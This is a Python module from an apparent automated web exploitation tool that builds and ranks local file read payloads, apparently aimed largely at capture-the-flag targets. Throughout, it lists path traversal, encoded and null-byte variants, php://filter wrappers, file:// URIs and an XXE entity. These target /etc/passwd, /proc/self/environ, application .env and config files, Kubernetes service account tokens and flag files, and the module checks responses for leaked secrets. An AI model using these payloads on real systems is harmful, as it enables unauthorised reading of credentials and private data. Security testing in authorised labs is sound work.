from __future__ import annotations

import base64
import json
import re
from typing import cast
from urllib.parse import parse_qsl, quote, urlsplit

from ravage.web_core.http_probe import ProbeResponse, ProbeSession, response_secrets
from ravage.web_core.proof_recognizer import recognize_proofs


def _file_read_probe_payloads_for_target(session: ProbeSession, target: dict[str, object]) -> list[str]:
    payloads = _file_read_probe_payloads(session)
    if str(target.get("kind") or "") in {"direct_path", "apache_cgi_shell"}:
        return _apache_file_read_payloads()
    if _target_looks_static_resource_selector(target):
        return _dedupe(_static_resource_payloads() + payloads)
    if target.get("fallback"):
        return _dedupe(
            [
                "/etc/passwd",
                "../../../../../proc/self/root/etc/passwd",
            ]
        )
    if target.get("synthetic"):
        return _dedupe(
            [
                "/etc/passwd",
                "../../../../../proc/self/root/etc/passwd",
                "../../../../etc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
            ]
        )
    if _target_looks_url_fetch(target):
        return _dedupe(_url_fetch_file_read_payloads() + payloads)
    return payloads


def _quick_file_read_probe_payloads_for_target(session: ProbeSession, target: dict[str, object]) -> list[str]:
    if str(target.get("kind") or "") in {"direct_path", "apache_cgi_shell"}:
        return _apache_file_read_payloads()[:5]
    if _target_looks_static_resource_selector(target):
        return _dedupe(
            _static_resource_payloads()
            + [
                "/etc/passwd",
                "../../../../etc/passwd",
                "../../../../../proc/self/root/etc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
            ]
        )[:12]
    if target.get("fallback"):
        return ["/etc/passwd", "../../../../../proc/self/root/etc/passwd"]
    if target.get("synthetic"):
        return [
            "/etc/passwd",
            "../../../../etc/passwd",
            "../../../../../proc/self/root/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]
    if _target_looks_url_fetch(target):
        payloads = _url_fetch_file_read_payloads()[:5]
        payloads.extend(
            [
                "../../../../../proc/self/root/etc/passwd",
                "/etc/passwd",
                "/proc/self/environ",
            ]
        )
        return _dedupe(payloads)
    return [
        "/etc/passwd",
        "../../../../etc/passwd",
        "../../../../../proc/self/root/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "/proc/self/environ",
    ]


def _file_read_probe_payloads(session: ProbeSession) -> list[str]:
    del session
    return _dedupe(
        [
            "/etc/passwd",
            "/etc/hosts",
            "/proc/self/environ",
            "/flag",
            "/flag.txt",
            "flag",
            "flag.txt",
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../../proc/self/environ",
            "../../../../flag",
            "../../../../flag.txt",
            "../../../../../proc/self/root/etc/passwd",
            "../../../../../../proc/self/root/etc/passwd",
            _url_encoded_lfi_payload("../../../etc/passwd"),
            _url_encoded_lfi_payload("../../../../etc/passwd"),
            _double_url_encoded_lfi_payload("../../../etc/passwd"),
            "../../../../etc/passwd%00",
            "../../../../flag.txt%00",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "<!DOCTYPE x [<!ENTITY r SYSTEM 'file:///etc/passwd'>]><x>&r;</x>",
        ]
    )


def _candidate_file_payloads_for_primitive(primitive: dict[str, object]) -> list[str]:
    confirmed_payload = str(primitive.get("payload") or "")
    if _primitive_include_suffix(primitive):
        return _php_include_root_payloads_for_primitive(primitive)

    payloads = _candidate_file_payloads(confirmed_payload)
    target = _dict_value(primitive.get("target"))
    if str(target.get("kind") or "") in {"direct_path", "apache_cgi_shell"}:
        return payloads
    if not _target_looks_url_fetch(target):
        return payloads

    file_uri_payloads: list[str] = []
    for candidate in _absolute_flag_paths()[:54]:
        file_uri_payloads.append("file://" + candidate)
    file_uri_payloads.extend(
        [
            "file:///proc/self/environ",
            "file:///proc/1/environ",
            "file:///app/.env",
            "file:///app/config.py",
            "file:///usr/src/app/config.py",
        ]
    )
    return _dedupe(file_uri_payloads + payloads)[:90]


def _primitive_include_suffix(primitive: dict[str, object]) -> str:
    signal = _dict_value(primitive.get("signal"))
    entrypoint = _dict_value(signal.get("entrypoint"))
    if str(signal.get("kind") or "") != "php_include_entrypoint":
        return ""
    return str(entrypoint.get("suffix") or "")


def _absolute_flag_paths() -> list[str]:
    return ["/" + path.lstrip("/") for path in _flag_file_candidates()]


def _php_log_paths(confirmed_payload: str) -> list[str]:
    prefixes = _payload_prefixes(confirmed_payload)
    logs = [
        "var/log/apache2/access.log",
        "var/log/apache2/error.log",
        "proc/self/root/var/log/apache2/access.log",
        "proc/self/root/var/log/apache2/error.log",
        "var/log/nginx/access.log",
        "var/log/nginx/error.log",
        "proc/self/environ",
    ]
    payloads: list[str] = []
    for prefix in prefixes:
        payloads.extend(prefix + item for item in logs)
    return _dedupe(payloads)[:30]


def _candidate_file_payloads_from_content(body: str, confirmed_payload: str) -> list[str]:
    candidates: list[str] = []
    for match in re.finditer(
        r"""(?ix)
        ["'`]
        (
            (?:/|[A-Za-z0-9_.-]+/)
            [A-Za-z0-9_./-]{0,180}
            (?:flag|proof|secret|token|config|settings|credential|passwd|\.env|\.key|\.pem)
            [A-Za-z0-9_./-]{0,80}
        )
        ["'`]
        """,
        body,
    ):
        candidates.append(match.group(1))

    for match in re.finditer(
        r"\b(/[A-Za-z0-9_./-]{0,220}(?:flag|proof|secret|token|config|settings|credential|passwd|\.env|\.key|\.pem)[A-Za-z0-9_./-]{0,80})\b",
        body,
        flags=re.IGNORECASE,
    ):
        candidates.append(match.group(1))

    payloads: list[str] = []
    prefixes = _payload_prefixes(confirmed_payload)
    for candidate in _dedupe(candidates)[:24]:
        normalized = candidate.lstrip("/")
        if candidate.startswith("/"):
            payloads.append(candidate)
            payloads.append(f"php://filter/convert.base64-encode/resource={candidate}")
        for prefix in prefixes:
            payloads.append(prefix + normalized)
    return _dedupe(payloads)[:48]


def _decoded_text_fragments(body: str) -> list[str]:
    fragments: list[str] = []
    for token in re.findall(r"\b[A-Za-z0-9+/]{40,}={0,2}\b", body):
        try:
            decoded = base64.b64decode(token, validate=True)
        except Exception:  # noqa: BLE001 - arbitrary response text.
            continue
        rendered = decoded.decode("utf-8", errors="replace")
        lowered = rendered.lower()
        if any(marker in lowered for marker in ("<?php", "flag", "secret", "token", "config", "password", "$_get", "$_post")):
            fragments.append(rendered)
    return fragments[:6]


def _file_read_signal(response: ProbeResponse, *, baseline: ProbeResponse) -> dict[str, object] | None:
    body = response.body
    baseline_body = baseline.body
    if _passwd_like(body) and not _passwd_like(baseline_body):
        return {"kind": "local_file_read", "indicator": "passwd", "matches": _passwd_users(body)[:8]}
    if _hosts_like(body) and not _hosts_like(baseline_body):
        return {"kind": "local_file_read", "indicator": "hosts", "matches": ["127.0.0.1 localhost"]}

    environment_keys = _new_environment_keys(body, baseline_body)
    if len(environment_keys) >= 2:
        return {"kind": "local_file_read", "indicator": "environ", "matches": environment_keys[:8]}

    proofs = _new_proofs(body, baseline.body)
    if proofs:
        return {"kind": "proof_read", "indicator": "proof", "proofs": proofs}

    secrets = _new_high_value_secrets(response, baseline)
    if secrets:
        return {"kind": "secret_read", "indicator": "secret", "matches": secrets[:8]}

    return None


def _url_fetch_file_read_payloads() -> list[str]:
    return [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "file:///proc/1/environ",
        "file:///flag",
        "file:///flag.txt",
        "file:///app/flag",
        "file:///app/flag.txt",
    ]


def _static_resource_payloads() -> list[str]:
    return [
        "flag",
        "FLAG",
        "flag.txt",
        "FLAG.txt",
        "proof",
        "proof.txt",
        "secret",
        "secret.txt",
        "static/flag",
        "static/flag.txt",
        "css/flag",
        "js/flag",
        "../flag",
        "../flag.txt",
    ]


def _apache_file_read_payloads() -> list[str]:
    return _dedupe(
        _flag_file_candidates()
        + [
            "etc/passwd",
            "proc/self/root/etc/passwd",
            "etc/hosts",
            "proc/self/environ",
        ]
    )


def _url_encoded_lfi_payload(payload: str) -> str:
    return quote(payload, safe="")


def _double_url_encoded_lfi_payload(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def _candidate_file_payloads(confirmed_payload: str) -> list[str]:
    prefixes = _payload_prefixes(confirmed_payload)
    files = _flag_file_candidates() + [
        "run/secrets/flag",
        "run/secrets/FLAG",
        "run/secrets/token",
        "var/run/secrets/kubernetes.io/serviceaccount/token",
        "var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "proc/1/environ",
        "var/www/html/.env",
        "var/www/html/config.php",
        "var/www/html/db.php",
        "var/www/html/index.php",
        "var/www/html/post.php",
        "app/.env",
        "app/config.php",
        "app/config.py",
        "app/settings.py",
        "usr/src/app/.env",
        "usr/src/app/config.py",
    ]
    payloads: list[str] = []
    for prefix in prefixes:
        payloads.extend(prefix + item for item in files)
    for item in files[:36]:
        absolute = "/" + item.lstrip("/")
        payloads.append(f"php://filter/convert.base64-encode/resource={absolute}")
    return _dedupe(payloads)[:70]


def _php_include_root_payloads_for_primitive(primitive: dict[str, object]) -> list[str]:
    confirmed_payload = str(primitive.get("payload") or "")
    candidates = [
        "/var/www/html",
        "/var/www",
        "/app",
        "/usr/src/app",
        "/srv/app",
        "/srv/www",
        "/opt/app",
        ".",
        "..",
        "../..",
        "../../..",
    ]
    for prefix in _payload_prefixes(confirmed_payload):
        normalized = prefix.rstrip("/")
        if normalized:
            candidates.append(normalized)
    if _confirmed_payload_looks_include_root(confirmed_payload):
        candidates.insert(0, confirmed_payload.rstrip("/"))
    return _dedupe(candidates)[:24]


def _confirmed_payload_looks_include_root(payload: str) -> bool:
    if not payload:
        return False
    pattern = r"(?:^|/)(?:flag|proof|secret|token|passwd)(?:\.|/|$)"
    return re.search(pattern, payload, re.IGNORECASE) is None


def _target_looks_url_fetch(target: dict[str, object]) -> bool:
    input_name = _target_input_name(target).lower()
    if input_name in {"url", "uri", "link", "href", "src", "redirect", "next", "target", "callback", "webhook"}:
        return True
    text = json.dumps(target, sort_keys=True).lower()
    return any(marker in text for marker in ("url", "uri", "webhook", "fetch", "remote"))


def _target_looks_static_resource_selector(target: dict[str, object]) -> bool:
    input_name = _target_input_name(target).lower()
    if input_name not in {"file", "filename", "path", "resource", "asset"}:
        return False
    url = str(target.get("url") or "")
    current = _current_query_value(url, input_name)
    if not current:
        return False
    lowered = (url + " " + current).lower()
    if not (_value_looks_file_name(current) or "/" in current):
        return False
    return any(marker in lowered for marker in ("static", "asset", "resource", "css/", "js/", "images/", "img/"))


def _flag_file_candidates() -> list[str]:
    basenames = (
        "flag",
        "flag.txt",
        "flag.php",
        "FLAG",
        "FLAG.txt",
        "FLAG.php",
        "proof.txt",
        "user.txt",
        "root.txt",
    )
    directories = (
        "",
        "tmp",
        "var/www",
        "var/www/html",
        "app",
        "usr/src/app",
        "srv/app",
        "workspace",
        "run/secrets",
        "home/ctf",
        "root",
    )
    candidates: list[str] = []
    for directory in directories:
        for basename in basenames:
            candidates.append(f"{directory}/{basename}" if directory else basename)
    return _dedupe(candidates)


def _payload_prefixes(payload: str) -> list[str]:
    normalized = payload.lstrip("/")
    prefixes: list[str] = []
    if payload.startswith("/"):
        prefixes.append("/")
    if "/" in normalized:
        directory = normalized.rsplit("/", 1)[0]
        if directory and not directory.endswith(("etc", "proc/self/root/etc")):
            prefixes.append(directory.rstrip("/") + "/")
    if "etc/passwd" in normalized:
        prefixes.append(normalized.split("etc/passwd", 1)[0])
    if "proc/self/root/etc/passwd" in normalized:
        prefixes.append(normalized.split("proc/self/root/etc/passwd", 1)[0] + "proc/self/root/")
    prefixes.extend(["../../../../", "../../../../../", "../../../../../../", "../../../../../proc/self/root/"])
    return _dedupe(prefixes)


def _new_environment_keys(body: str, baseline_body: str) -> list[str]:
    baseline_keys = set(_environment_keys(baseline_body))
    keys: list[str] = []
    for key in _environment_keys(body):
        if key not in baseline_keys:
            keys.append(key)
    return keys


def _new_proofs(body: str, baseline_body: str) -> list[str]:
    baseline_proofs = set(recognize_proofs(baseline_body))
    proofs: list[str] = []
    for proof in recognize_proofs(body):
        if proof not in baseline_proofs:
            proofs.append(proof)
    return proofs


def _new_high_value_secrets(response: ProbeResponse, baseline: ProbeResponse) -> list[str]:
    baseline_secrets = set(response_secrets(baseline))
    secrets: list[str] = []
    for item in response_secrets(response):
        if item in baseline_secrets:
            continue
        if item.startswith("filesystem_path:"):
            continue
        secrets.append(item)
    return secrets


def _target_input_name(target: dict[str, object]) -> str:
    return str(target.get("input") or target.get("name") or "")


def _current_query_value(url: str, name: str) -> str:
    try:
        values = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    except ValueError:
        return ""
    for key, value in values:
        if key == name:
            return value
    return ""


def _value_looks_file_name(value: str) -> bool:
    return bool(re.search(r"\.[a-z0-9]{1,6}(?:$|[?#])", value.lower()))


def _passwd_like(body: str) -> bool:
    return "root:x:0:0:" in body and ("/bin/bash" in body or "/usr/sbin/nologin" in body)


def _passwd_users(body: str) -> list[str]:
    return re.findall(r"(?m)^([a-z_][a-z0-9_-]{0,31}):x:\d+:\d+:", body)


def _hosts_like(body: str) -> bool:
    localhost_v4 = re.search(r"(?m)^\s*127\.0\.0\.1\s+localhost\b", body)
    localhost_v6 = re.search(r"(?m)^\s*::1\s+localhost\b", body)
    return bool(localhost_v4) or bool(localhost_v6)


def _environment_keys(body: str) -> list[str]:
    keys = re.findall(r"\b(PATH|HOME|USER|HOSTNAME|PWD|SHELL|LANG|PYTHONPATH|DATABASE_URL|SECRET_KEY)=", body)
    return _dedupe(keys)


def _dict_value(value: object) -> dict[str, object]:
    if isinstance(value, dict):
        return cast(dict[str, object], value)
    return {}


def _dedupe(values: list[str]) -> list[str]:
    result: list[str] = []
    for value in values:
        if value and value not in result:
            result.append(value)
    return result
